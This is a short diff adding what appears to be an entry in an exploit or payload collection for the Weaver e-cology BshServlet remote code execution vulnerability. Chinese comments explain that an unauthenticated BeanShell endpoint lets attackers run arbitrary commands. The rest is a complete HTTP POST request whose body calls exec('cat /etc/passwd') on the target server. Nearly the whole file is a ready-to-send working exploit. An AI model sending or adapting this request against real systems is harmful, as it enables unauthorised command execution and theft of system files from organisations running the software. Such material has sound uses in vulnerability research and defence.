@@ -1,0 +1,10 @@
+# 泛微e-cology BshServlet远程代码执行漏洞
+# 该漏洞存在于泛微协同管理应用平台OA系统的BeanShell组件中，该组件为系统自带且允许未授权访问。攻击者通过调用BeanShell组件的问题接口可直接在目标服务器上执行任意命令。
+POST /bsh.servlet.BshServlet?acid=80025428&bid=hd_tag_m8mv260b HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv260b
+RM-PRO-Token: ecc8e89ee9ad6c1ce0ca4c8437846b2b
+RM-PRO-Time: 1742808519459
+User-Agent: curl/7.83.1
+
+id=bsh.script=exec("cat+/etc/passwd");&bsh.servlet.output=raw
